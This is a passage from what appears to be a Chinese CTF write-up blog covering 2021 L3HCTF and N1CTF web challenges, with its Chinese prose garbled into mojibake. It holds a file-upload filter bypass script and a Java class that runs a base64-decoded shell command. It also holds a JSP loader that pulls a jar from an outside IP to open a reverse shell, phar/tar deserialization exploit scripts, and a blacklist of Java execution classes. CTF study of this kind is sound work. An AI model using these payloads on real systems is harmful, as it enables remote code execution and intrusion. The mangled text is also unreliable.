Firefox/94.0&quot; &quot;-&quot;image-service-service-1 | map[blur:[20] text:[secret] textsize:[50] uuid:[4bb2c93b-b18f-42fc-97fc-ec5a3afbab64] x1:[200] y1:[200]]image-service-service-1 | //c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907image-service-service-1 | [GIN] 2021/11/16 - 10:05:42 | 403 | 65.684Âµs | 172.18.0.2 | GET &quot;/get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200&quot;211.97.128.174 - - [16/Nov/2021:10:07:26 +0000] &quot;GET /get?blur=0&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=0&amp;y1=200 HTTP/1.1&quot; 403 25 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot; &quot;-&quot;image-service-service-1 | map[blur:[0] text:[secret] textsize:[50] uuid:[4bb2c93b-b18f-42fc-97fc-ec5a3afbab64] x1:[0] y1:[200]]image-service-service-1 | //6c73f2e8bb98f6d40cc95e9d716a126e2fc6c320322df005cb1532c4a9ff3043 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907image-service-service-1 | [GIN] 2021/11/16 - 10:07:26 | 403 | 94.621Âµs | 172.18.0.2 | GET &quot;/get?blur=0&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=0&amp;y1=200&quot; 211.97.128.174 - - [16/Nov/2021:10:14:55 +0000] &quot;GET /get?blur:[20]%20text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1:[200]%20y1=200 HTTP/1.1&quot; 403 25 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot; &quot;-&quot;image-service-service-1 | map[blur:[20] text:[secret] textsize:[50] uuid:[4bb2c93b-b18f-42fc-97fc-ec5a3afbab64] x1:[200] y1:[200]]image-service-service-1 | //c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907image-service-service-1 | [GIN] 2021/11/16 - 10:14:55 | 403 | 68.117Âµs | 172.18.0.2 | GET &quot;/get?blur:[20]%20text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1:[200]%20y1=200&quot; å¯ä»¥çœ‹åˆ°æœ€ç»ˆçš„tookenå’Œä¸€å¼€å§‹è¾“å…¥blur20çš„æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯tookenæ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥æœ€ç»ˆçš„payloadæ˜¯ get?blur:[20] text=secret&amp;textsize=50&amp;token=61cb06c63c5fb86303c40f4bfd2ea04aa9d7cf3067f8f886c8b30f4e547bc803&amp;uuid=1293b342-b144-42ec-983d-96fba7c159b9&amp;x1:[200] y1=200 bypassä¸€å¼€å§‹æ˜¯æ–‡ä»¶åç¼€ç»•è¿‡ï¼Œç›´æ¥åŒå†™å°±å¯ä»¥äº†ï¼Œé—®é¢˜åœ¨äºåç»­æ­£åˆ™åŒ¹é…çš„ç»•è¿‡ï¼Œè¿™é‡Œæåˆ°ï¼Œä¸èƒ½è¾“å…¥ä¸¤ä¸ªè¿ç»­çš„å­—ç¬¦ä¸² public static boolean checkValidChars(String content) { Pattern pattern = Pattern.compile(&quot;[a-zA-Z0-9]{2,}&quot;); Matcher matcher = pattern.matcher(content); return matcher.find();} ä¸€å¼€å§‹æ˜¯å®šä½è¿™é‡Œï¼Œçœ‹è¿™ä¸ªgetStringæ˜¯å¦æœ‰ä»€ä¹ˆç‰¹æ€§ï¼Œåé¢æ˜¯æ²¡å‘ç°çš„ï¼ŒåªçŸ¥é“ä»–æ˜¯å°†å…¶ä½œä¸ºstringè¯»å…¥ String content = item.getString(); æ„Ÿè§‰ä¹‹å‰çš„å¤§å¸ˆå‚…ç¦»æˆåŠŸåº”è¯¥æ˜¯åªæœ‰ä¸€æ­¥ä¹‹é¥äº† 1.å½“formä¸­è®¾ç½®method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;æ—¶æ‰èƒ½æ­£å¸¸ä¸Šä¼ ã€‚2.commons-fileuploadä¸Šä¼ ä¸­å¦‚æœformä¸­çš„å‚æ•°æœ‰ä¸­æ–‡ï¼Œæ­¤æ—¶ç”¨item.getString()ä¼šå‡ºç°ä¹±ç ï¼Œå¿…é¡»ç”¨item.getString(&quot;UTF-8&quot;)ï¼ŒUTF-8ä¸ºç¼–ç æ–¹å¼ã€‚åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/pg_guo/article/details/8753449 é€šè¿‡æµ‹è¯•ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œä»–æ˜¯æ²¡æœ‰è¿‡æ»¤æ±‰å­—ï¼Œé‚£ä¹ˆæ±‰å­—ä¹±ç è‚¯å®šæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯¹æ–‡æœ¬ä½¿ç”¨å…¶ä»–ç¼–ç å½¢å¼ï¼Œæ¯”å¦‚è¯´å½“utf-16çš„æ–‡æœ¬ï¼Œä»¥utf-8çš„å½¢å¼æ‰“å¼€ï¼Œé‚£è‚¯å®šæ˜¯ä¼šå˜æˆä¹±ç çš„ï¼Œæ ¹æ®è¿™ä¸ªæ€è·¯ï¼Œå°±å¯ä»¥ç»•è¿‡äº†ï¼Œå†™ä¸€ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬ï¼ˆå·²ç»æœ‰å¤§å¸ˆå‚…å†™è¿‡äº†ï¼‰ import requestsdef file_op(filename,filedata): print(&quot;filename: &quot;,filename) print(&quot;filedata: &quot;, filedata) with open(filename,'wb') as f: f.write(filedata) r = requests.post('http://123.60.20.221:10001/UploadServlet', files={&quot;filename&quot;: open(filename, &quot;rb&quot;)}) print(r.text) if &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ! æ–‡ä»¶è·¯å¾„: /usr&quot; in r.text: url = &quot;http://123.60.20.221:10001/&quot; + r.text.replace( &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ! æ–‡ä»¶è·¯å¾„: /usr/local/apache-tomcat-8.5.72/webapps/ROOT/&quot;, &quot;&quot;) print(url) r = requests.get(url) print(r.text) print(r.content) return r.textif __name__==&quot;__main__&quot;: filename=&quot;1.jjspsp&quot; filedata=&quot;&quot;&quot; &quot;&quot;&quot;.encode('utf-16') file_op(filename,filedata) æ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡ç¬¬äºŒä¸ªé»‘åå•ï¼Œé‡Œé¢è¿‡æ»¤äº†å¾ˆå¤šå†…å®¹ï¼Œåœ¨å¯»æ‰¾ç»•è¿‡æ–¹å¼çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†å¾ˆå¤šæœ‰æ„æ€çš„æ–¹æ³•ï¼Œå†³å®šæ”¶è—ä¸€ä¸‹ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹Y4å¤§å¸ˆå‚…çš„è§£é¢˜æ–¹æ³• https://f5.pm/go-61281.html ä»–çš„é»‘åå•å®åœ¨å¤šï¼š é»‘åå•Runtimeã€\\uã€ScriptEngineã€newInstanceã€ProcessBuilderã€invokeã€Fileã€defineClassã€lookupï¼ŒJdbcRowSetImplç­‰ ç„¶åå†æ¬¡ä½©æœä¸€ä¸‹å¤§å¸ˆå‚…ä»¬ï¼Œå¤ªç‰›äº†ï¼Œè¿™é‡Œç”¨åˆ°çš„æ–¹æ³•æ˜¯ï¼Œä½¿ç”¨UrlClassLoaderä¸Class.forNameåœ¨åˆå§‹åŒ–å¯¹è±¡æ—¶æ‰§è¡Œå‘½ä»¤ï¼Œé¦–å…ˆå­¦ä¹ ä¸‹è¿™ä¸¤ä¸ªåŒ… UrlClassLoader:URLClassLoader å¯ä»¥åŠ è½½è¿œç¨‹ç±»åº“å’Œæœ¬åœ°è·¯å¾„çš„ç±»åº“#å…¶å®æ˜¨æ™šåœ¨åšçš„æ—¶å€™æœ‰çœ‹åˆ°è¿™ä¸ªæ€è·¯ï¼Œä½†æ˜¯å½“æ—¶å‘ç°æœ‰ç”¨åˆ°newInstanceï¼Œæ‰€ä»¥å°±æ²¡å¾€ä¸‹ç»§ç»­æƒ³äº†ï¼Œæœ‰ç‚¹å¯æƒœClass.forNameï¼šè£…è½½ä¸€ä¸ªç±»å¹¶ä¸”å¯¹å…¶è¿›è¡Œå®ä¾‹åŒ–çš„æ“ä½œï¼Œè£…è½½è¿‡ç¨‹ä¸­ä½¿ç”¨åˆ°çš„ç±»åŠ è½½å™¨æ˜¯å½“å‰ç±» Class.forName(xxx.xx.xx)è¿”å›çš„æ˜¯ä¸€ä¸ªç±»ã€‚Class.forName(xxx.xx.xx)çš„ä½œç”¨æ˜¯è¦æ±‚JVMæŸ¥æ‰¾å¹¶åŠ è½½æŒ‡å®šçš„ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´JVMä¼šæ‰§è¡Œè¯¥ç±»çš„é™æ€ä»£ç æ®µè¿™é‡Œè¯´è¯´è‡ªå·±çš„ç†è§£:class.fornameå…¶å®å°±æ˜¯ç”Ÿæˆè¿™ä¸ªç±»çš„class é¦–å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»ï¼Œå¹¶æ‰“åŒ…jarä¸Šä¼ æœåŠ¡å™¨ï¼Œè¿™é‡Œåœ¨å­¦ä¹ ä¸€ä¸‹äº†ï¼Œå¦‚ä½•åˆ›å»ºä¸€ä¸ªjaråŒ…ã€‚ã€‚ã€‚https://www.hangge.com/blog/cache/detail_2750.html è´´ä¸€ä¸‹æ¶æ„åŒ…çš„ä»£ç : package com.tlif;import java.io.IOException;import java.io.UncheckedIOException;public class bad_class { static { try{ Runtime.getRuntime().exec(new String[]{&quot;bash&quot;,&quot;-c&quot;,&quot;echo xxxxx|base64 -d|sh&quot;}); } catch (IOException e){ e.printStackTrace(); } } public static void main(String[] args){new bad_class();}} æ¥ä¸‹æ¥å°†å…¶æ‰“åŒ…æˆjaråŒ…ä¸Šä¼ è‡³æœåŠ¡å™¨ï¼ˆè®°å¾—é…ç½®javaç¯å¢ƒï¼Œä¸ç„¶è¿è¡Œä¸äº†ï¼‰ç„¶åä¸Šä¼ è®¿é—®è¯¥jaråŒ…çš„jspæœ¨é©¬ &lt;%@ page import=&quot;java.net.URL&quot; %&gt;&lt;%@ page import=&quot;java.net.URLClassLoader&quot; %&gt;&lt;% URL url = new URL(&quot;http://110.42.133.120/l3ctf_bp.jar&quot;); URLClassLoader ucl = new URLClassLoader(new URL[]{url}); Class.forName(&quot;com.tlif.bad_class&quot;,true,ucl);%&gt; æ¥ä¸‹æ¥è®¿é—®jspæ–‡ä»¶ï¼Œå³å¯åå¼¹shell fastjsonæ¯”èµ›çš„æ—¶å€™çœ‹éƒ½çœ‹æ²¡çœ‹çš„ä¸€é“é¢˜ï¼Œæ‰€ä»¥è´´ä¸€ä¸‹åˆ«äººçš„wpæ”¶è—ä¸€ä¸‹","link":"/2021/11/14/2021l3ctf/"},{"title":"2021nu1lctf","text":"signin&lt;?php//flag is /flag$path=$_POST['path'];$time=(isset($_GET['time'])) ? urldecode(date(file_get_contents('php://input'))) : date(&quot;Y/m/d H:i:s&quot;);$name=&quot;D:\\apache\\www\\nu1l\\\\&quot;.time().rand().'.txt';$black=&quot;f|ht|ba|z|ro|;|,|=|g|da|_&quot;;$blist=explode(&quot;|&quot;,$black);foreach($blist as $b){ if(strpos($path,$b) !== false){ die('111'); }}if(file_put_contents($name, $time)){ echo &quot;&lt;pre class='language-html'&gt;&lt;code class='language-html'&gt;logpath:$name&lt;/code&gt;&lt;/pre&gt;&quot;;}$check=preg_replace('/((\\s)*(\\n)+(\\s)*)/i','',file_get_contents($path));if(is_file($check)){ echo &quot;&lt;pre class='language-html'&gt;&lt;code class='language-html'&gt;&quot;.file_get_contents($check).&quot;&lt;/code&gt;&lt;/pre&gt;&quot;;} è€ƒç‚¹ä¸»è¦åœ¨äºç»•è¿‡dateçš„æ··æ·†ï¼ŒæŸ¥é˜…äº†ä¸€ä¸‹æ–‡æ¡£ï¼Œå‘ç°åŠ äº†åæ–œæ ä»¥åä¸ä¼šè¢«dateå‡½æ•°ç»™å¤„ç†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¾“å…¥///f/a/l/gå­˜å…¥logä¸­å³ä¸º/flagï¼Œåé¢åˆä¼šlogæ–‡ä»¶é‡Œé¢è¯»å‡ºå€¼ï¼Œç„¶åä»file_get_contentä¸­è¯»å–/flagçš„å€¼ï¼Œå³å¯æ‹¿åˆ°flag easy_phpè€ƒç‚¹ pharååºåˆ—åŒ–ï¼Œä½†æ˜¯é‡ç‚¹åœ¨äºå¦‚ä½•ç»•è¿‡è„å­—ç¬¦ é¦–å…ˆæˆ‘ä»¬éœ€è¦è§¦å‘çš„å…¥å£åœ¨å“ªé‡Œï¼Œåªæœ‰è¿™é‡ŒåŒ…å«äº†flag.phpï¼Œå¹¶ä¸”å­˜åœ¨file_existsè€Œä¸”fileæ˜¯å¯æ§çš„ &lt;?phpinclude_once &quot;flag.php&quot;;include_once &quot;log.php&quot;;if(file_exists(@$_GET[&quot;file&quot;])){ echo &quot;file exist!&quot;;}else{ echo &quot;file not exist!&quot;;}?&gt; è¿™ä¹Ÿå°±æ˜¯æ„å‘³ç€ï¼Œæˆ‘ä»¬åœ¨log.phpé‚£è¾¹å†™å…¥æ–‡ä»¶ï¼Œåœ¨index.phpé‚£é‡Œè¯» é¦–å…ˆæˆ‘ä»¬éœ€è¦ç†æ¸…æ¥šè§¦å‘pharçš„æ¡ä»¶æ˜¯å¦éƒ½å¯ä»¥å…·å¤‡ï¼Ÿï¼Œæœ€å¤§çš„é—®é¢˜åœ¨äºè¿™é‡Œï¼Œpharæ–‡ä»¶è¦æ±‚ï¼Œä»–æ˜¯éœ€è¦åå››ä½å¿…é¡»ä¸ºGBMBä½œä¸ºç­¾åæ¥è¯†åˆ«çš„ï¼Œä½†æ˜¯å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å†™å…¥çš„å†…å®¹åå››ä½ä¼šè¢«æ²¡æ³•æ˜¯GBMB $log = 'Time: ' . date('Y-m-d H:i:s') . ' IP: [' . @$_SERVER['HTTP_X_FORWARDED_FOR'] . '], REQUEST: [' . $gets . '], CONTENT: [' . file_get_contents('php://input') . &quot;]\\n&quot;;$log_file = $log_ip_dir . '/' . $log_type . '_www.log';file_put_contents($log_file, $log, FILE_APPEND); æ‰€ä»¥è¿™é‡Œå°±éœ€è¦æ¢ä¸€ç§æ€è·¯æ¥è§£å†³äº†ï¼Œphar://å¯ä»¥ååºåˆ—åŒ–çš„æ–‡ä»¶æœ‰zip, tar, pharï¼Œzipçš„æ–‡ä»¶æ›´åŠ ä¸¥æ ¼äº†ï¼Œä¼¼ä¹ä¸æ˜¯ç›´æ¥åˆ›å»ºå°±å¯ä»¥çš„â€“ï¼Œå¤§æ¦‚åŸå› æ˜¯ä»–æ˜¯å‹ç¼©æ–‡ä»¶æ ¼å¼å§ï¼Œæˆ‘ä»¬åˆ†åˆ«æµ‹è¯•ä¸€ä¸‹çœ‹çœ‹å“ªä¸€ç§ä¸ä¼šå› ä¸ºè„å­—ç¬¦æ–‡ä»¶å°¾è€Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ï¼Œåˆ†åˆ«å¯¹pharå’Œtarè¾“å‡ºä»–ä»¬æ–‡ä»¶å†…å®¹: å¯ä»¥å‘ç°pharæ–‡ä»¶çš„æ–‡ä»¶å°¾æ˜¯GBMBï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é’ˆå¯¹æµ‹è¯•ä¸€ä¸‹ä¿®æ”¹æ–‡ä»¶åç¼€ã€æ–‡ä»¶å°¾ã€æ–‡ä»¶å¤´è¯•è¯•1.æ–‡ä»¶å¤´æ ¼å¼ä¸ºxxx&lt;?php xxx; __HALT_COMPILER();?&gt;ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();?&gt;æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚å¹¶ä¸”åœ¨phpå½“ä¸­ç”Ÿæˆpharæ–‡ä»¶çš„æ—¶å€™ï¼Œè¿™éƒ¨åˆ†å†…å®¹æ— æ³•æ›´æ”¹ï¼Œæ›´æ”¹ä»¥åå°†æ— æ³•æ­£ç¡®ç”Ÿæˆpharæ–‡ä»¶ï¼Œä½†å…¶å®åœ¨æœ¬é¢˜å½“ä¸­æ²¡å¤šå¤§å½±å“ï¼Œå› ä¸ºç”Ÿæˆpharæ–‡ä»¶çš„æ—¶å€™ï¼Œè¿™ä¸ªå¤´æ˜¯è¿æ¥åºåˆ—åŒ–å†…å®¹ä¸€èµ·å†™å…¥çš„ï¼Œä¸ä¼šè¢«æ‰“æ–­ï¼Œå¹¶ä¸”&lt;?phpå‰é¢æœ‰ä»€ä¹ˆå†…å®¹éƒ½æ²¡æœ‰å½±å“ 2.æ–‡ä»¶å°¾æ–‡ä»¶å°¾éœ€è¦GBMBç»“å°¾ï¼Œå¯ä»¥å‘ç°ï¼Œå¦‚æœè¢«æˆªæ–­çš„è¯ï¼Œå°†æ— æ³•æ­£ç¡®è¯»å– é‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯æ„å»ºtaræ–‡ä»¶ï¼Œè¿›è¡Œpharååºåˆ—åŒ–äº† æ–¹æ³•ä¸€ç¯å¢ƒæ­å»ºè¿‡ç¨‹: docker run -t easyphp -f ./Dockerfile .systemctl daemon-reloadsudo service docker restartsudo service docker status é¦–å…ˆç†ä¸€ä¸‹æ€è·¯ï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°æ„é€ äº†ä¸€ä¸ªtaråŒ…ï¼Œéœ€è¦åšçš„æ˜¯å°†å®ƒè¯»å–å‡ºæ¥å†™å…¥logæ–‡ä»¶é‡Œé¢ï¼Œé‚£ä¹ˆå¦‚ä½•å°†å…¶è§„èŒƒçš„å†™å…¥åº”è¯¥æ˜¯æˆ‘ä»¬é¢å¯¹çš„é—®é¢˜ï¼Œè¿™é‡Œç›´æ¥å‚è€ƒå¤§å¸ˆå‚…stdçš„è„šæœ¬äº† &lt;?phperror_reporting(0);CLASS FLAG { public function __destruct(){ echo &quot;FLAG: &quot; . $this-&gt;_flag; }}@unlink(&quot;get_flag.tar&quot;);$phar=new PharData(&quot;get_flag.tar&quot;);$phar[&quot;ABCDstypr&quot;] = &quot;GETFLAGGETFLAG&quot;;$obj = new FLAG();print($phar);$phar-&gt;setMetadata($obj); æ¥ä¸‹æ¥å°†å…¶è½¬åŒ–ä¸€ä¸‹å‘é€è¿‡å»ï¼Œå†™ä¸€ä¸ªè„šæœ¬æ¥å®ç°ï¼Œè¿™é‡Œä¸»è¦ä»¥å­¦ä¹ ä¸ºä¸»äº†â€“ Python ljust() æ–¹æ³•è¿”å›ä¸€ä¸ªåŸå­—ç¬¦ä¸²å·¦å¯¹é½,å¹¶ä½¿ç”¨ç©ºæ ¼å¡«å……è‡³æŒ‡å®šé•¿åº¦çš„æ–°å­—ç¬¦ä¸²ã€‚ å¦‚æœæŒ‡å®šçš„é•¿åº¦å°äºåŸå­—ç¬¦ä¸²çš„é•¿åº¦åˆ™è¿”å›åŸå­—ç¬¦ä¸²ã€‚ ä¸€ä¸‹æ˜¯å¤„ç†ä¸ºæ–°æ•°æ®çš„è¿‡ç¨‹ with open(&quot;get_flag.tar&quot;, &quot;rb&quot;) as f: data = f.read() new_name = generated_metadata.ljust(100,'\\x00').encode() new_data = new_name + data[100:] checksum = calc_checksum(new_data) new_checksum = oct(checksum).rjust(7,'0').encode()+b'\\x00' new_data = new_name + data[100:148] + new_checksum + data[156:] with open(&quot;get_flag.log&quot;, &quot;wb&quot;) as f: f.write(new_data) f.write(b&quot;]\\n&quot;) ç”Ÿæˆåˆæ³•çš„logæ–‡ä»¶ import osimport sysimport structimport requestsfrom datetime import datetimedef calc_checksum(data): return sum(struct.unpack_from(&quot;148B8x356B&quot;,data))+256if __name__==&quot;__main__&quot;: # generate date and phar content generated_date = os.popen(&quot;php exp_gen.php&quot;).read().split(&quot;FLAG: &quot;)[0] generated_type = &quot;styp979&quot; generated_metadata = &quot;Time: &quot; + generated_date + &quot; IP: [], REQUEST: [log_type=&quot; + generated_type + &quot;], CONTENT: [&quot; # make it into phar format with open(&quot;get_flag.tar&quot;, &quot;rb&quot;) as f: data = f.read() new_name = generated_metadata.ljust(100,'\\x00').encode() new_data = new_name + data[100:] checksum = calc_checksum(new_data) new_checksum = oct(checksum).rjust(7,'0').encode()+b'\\x00' new_data = new_name + data[100:148] + new_checksum + data[156:] with open(&quot;get_flag.log&quot;, &quot;wb&quot;) as f: f.write(new_data) f.write(b&quot;]\\n&quot;) å°†å…¶å‘é€è‡³æœåŠ¡å™¨ print(&quot;Sending exp to the server...&quot;)with open(&quot;get_flag.log&quot;, &quot;rb&quot;) as f: requests.post(&quot;http://xx/log.php?log_type=&quot; + generated_type, data=f.read().replace(generated_metadata, &quot;&quot;).replace(&quot;]\\n&quot;,&quot;&quot;)).text# getflagprint(&quot;Getflag!&quot;)print(requests.get(&quot;http://xx/index.php?file=phar://log/158.101.144.10/&quot; +generated_type + &quot;_www.log&quot;).text) å‘ç‚¹è¯´æ˜¯å‘ç‚¹ï¼Œå…¶å®ä¹Ÿä¸ç®—å§ï¼Œå°±æ˜¯ç”Ÿæˆæ—¶é—´æˆ³çš„é‚£ä¸ªï¼Œåœ¨windowsç³»ç»Ÿä¸Šä¸çŸ¥é“ä¸ºå•¥æ‰§è¡Œä¸æ¥ï¼Œå¤§æ¦‚æ˜¯æ²¡æƒé™å§ï¼Œæ‰€ä»¥æˆ‘åªèƒ½æ¬åˆ°æœåŠ¡å™¨ä¸Šå»æ‰§è¡Œ==ï¼Œä¸ºå•¥è¿™ä¸ªæ—¶é—´æˆ³è¿™ä¹ˆé‡è¦å‘¢ï¼Ÿæ€è€ƒäº†ä¸€ä¸‹ï¼Œtaræ–‡ä»¶æ•°æ®æœ‰æ¯”è¾ƒä¸¥æ ¼çš„æ ¼å¼è¦æ±‚ï¼Œè€Œæ­¤æ—¶æˆ‘ä»¬æ˜¯å°†æ•´ä¸ªlogæ–‡ä»¶ä½œä¸ºä¸€ä¸ªtaræ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬è¿™ä¸ªæ—¶é—´æˆ³æ²¡æœ‰å®æ—¶æ›´æ–°ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ„é€ ä»¥åå†™å…¥çš„æ•°æ®å’Œç°åœ¨é‡æ–°ç”Ÿæˆçš„æ—¶é—´æˆ³ï¼ˆä¹Ÿå°±æ˜¯contentå‰é¢çš„å†…å®¹ï¼‰æ‹¼æ¥ä»¥åï¼Œå°±ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„taræ–‡ä»¶æ ¼å¼äº†ï¼Œä¸¾ä¸ªä¾‹å­ï¼šå°±å¥½æ¯”ï¼Œæˆ‘åœ¨Aæ„é€ å¥½çš„ä¸œè¥¿ï¼Œå»äº†ä¸€åŠå»å’ŒBæ„é€ å¥½çš„æ‹¼æ¥æ‰§è¡Œï¼Œå°½ç®¡æ‹¼æ¥ä½ç½®ä¸€æ ·ï¼Œä½†æ˜¯å‰åæ•°æ®ä¸æ˜¯è¿è´¯ä¸€è‡´çš„ï¼Œæ‰€ä»¥éœ€è¦å®æ—¶æ›´æ–°æ—¶é—´æˆ³æ‰è¡Œã€‚ å®˜æ–¹wpè¿™é‡Œç›´æ¥N1çš„é¢˜è§£è„šæœ¬äº† &lt;?phpCLASS FLAG { //private $_flag; public function __destruct(){ echo &quot;FLAG: &quot; . $this-&gt;_flag; }}$ip = &quot;172.17.0.1&quot;;$log = 'Time: ' . date('Y-m-d H:i:s') . ' IP: [' . $ip . '], REQUEST: [], CONTENT: [';$data_len = strlen($log);if(!file_exists(&quot;./phar.tar&quot;)){ $phar = new PharData(dirname(__FILE__) . &quot;/phar.tar&quot;, 0, &quot;phartest&quot;, Phar::TAR); $phar-&gt;startBuffering(); $o = new FLAG(); $phar-&gt;setMetadata($o); $phar-&gt;addFromString($log, &quot;test&quot;); $phar-&gt;stopBuffering(); file_put_contents(&quot;./phar.tar&quot;, &quot;]\\n&quot;, FILE_APPEND);}$exp = file_get_contents(&quot;./phar.tar&quot;);$post_exp = substr($exp, $data_len);echo $post_exp;echo rawurlencode($post_exp); è¿™ä¸ªæ˜¯å®ƒçš„å†…å®¹è§‚å¯Ÿä¸€ä¸‹taræ–‡ä»¶é‡Œé¢çš„æƒ…å†µ å¯ä»¥å‘ç°æ˜¯æ–‡ä»¶åä¸ºlogæœ‰ç‚¹éš¾å—ï¼Œå¤ç°åˆ°è¿™é‡Œï¼Œå‘ç°ç¯å¢ƒå…³æ‰äº†ï¼Œè¿˜å¥½ç»™äº†dockeræ–‡ä»¶ï¼Œåœ¨æœåŠ¡å™¨ä¸Šè¯•è¯• æ¥ä¸‹æ¥å‘è¿‡å»å³å¯ import osimport requestsfrom urllib.parse import unquotedef execCmd(cmd): r = os.popen(cmd) text = r.read() r.close() return textheaders = { &quot;X-Forwarded-For&quot;: &quot;110.42.133.120&quot;}# write evil log fileexp = execCmd(&quot;php exp.php&quot;)r = requests.post(&quot;http://110.42.133.120:8080/&quot;, unquote(exp), headers=headers)print(r.text)# expr = requests.get(&quot;http://110.42.133.120:8080/?log_type=test&amp;file=phar://./log/172.17.0.1/look_www.log&quot;)# r = requests.get(&quot;http://testabc.com:10082/?log_type=test&amp;file=phar://./log/127.0.0.1/phar.tar&quot;)print(r.text) æ€è·¯æ•´ç†åšè¿™ç§é¢˜ç¡®å®å¾ˆçˆ½ï¼Œæ„Ÿè§‰æ€è·¯æœ‰åœ¨è¢«æ‰“å¼€ï¼Œè™½ç„¶æ˜¯çœ‹ç€wpè‰°éš¾å®Œæˆçš„ã€‚ã€‚ã€‚è¿™é‡Œæ¢³ç†ä¸€ä¸‹1.é¢˜ç›®å¾ˆæ˜æ˜¾éœ€è¦æˆ‘ä»¬pharååºåˆ—åŒ–ï¼Œä½†æ˜¯ç”±äºå†™å…¥çš„æ–‡ä»¶å°¾æœ‰è„å­—ç¬¦ï¼Œè€Œpharå¯¹åå››ä½çš„ç­¾åæœ‰è§„å®šï¼Œæ‰€ä»¥åªèƒ½å†™å…¥taræ–‡ä»¶ï¼Œå¾ˆå·§çš„æ˜¯ï¼Œä¸¤è€…æ›´æ”¹åç¼€éƒ½æ²¡æœ‰å½±å“ï¼Œåˆ¤æ–­æ–‡ä»¶çš„æ ‡å‡†æ˜¯æ–‡ä»¶å†…å®¹çš„æ•°æ®ï¼Œç¡®å®šä½¿ç”¨taræ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–åï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„é€ æ•°æ®åŒ… 2.äº†è§£tarçš„æ•°æ®ç»“æ„ï¼Œæ„é€ å‡ºå®Œæ•´æ­£ç¡®çš„tarå‹ç¼©åŒ…ä¼ è¿‡å»å³å¯ æ€è·¯çœ‹ä¼¼å¾ˆç®€å•ï¼Œä½†å…¶å®å…¶ä¸­çš„å‘æ˜¯æŒºå¤šçš„ï¼Œå¾ˆå¥½ï¼ï¼ï¼ funny_web&lt;?phpsession_start();//hint in /hint.txtif (!isset($_POST[&quot;url&quot;])) { highlight_file(__FILE__);}function uuid(){ $chars = md5(uniqid(mt_rand(), true)); $uuid = substr($chars, 0, 8) . '-' . substr($chars, 8, 4) . '-' . substr($chars, 12, 4) . '-' . substr($chars, 16, 4) . '-' . substr($chars, 20, 12); return $uuid;}function Check($url){ $blacklist = &quot;/l|g|[\\x01-\\x1f]|[\\x7f-\\xff]|['\\&quot;]/i&quot;; if (is_string($url) &amp;&amp; strlen($url) &lt; 4096 &amp;&amp; !preg_match($blacklist, $url)) { return true; } return false;}if (!isset($_SESSION[&quot;uuid&quot;])) { $_SESSION[&quot;uuid&quot;] = uuid();}echo $_SESSION[&quot;uuid&quot;].&quot;&lt;/br&gt;&quot;;if (Check($_POST[&quot;url&quot;])) { $url = escapeshellarg($_POST[&quot;url&quot;]); $cmd = &quot;/usr/bin/curl ${url} --output - -m 3 --connect-timeout 3&quot;; echo &quot;your command: &quot; . $cmd . &quot;&lt;/br&gt;&quot;; $res = shell_exec($cmd);} else { die(&quot;error~&quot;);}if (strpos($res, $_SESSION[&quot;uuid&quot;]) !== false) { echo $res;} else { echo &quot;you cannot get the result~&quot;;} 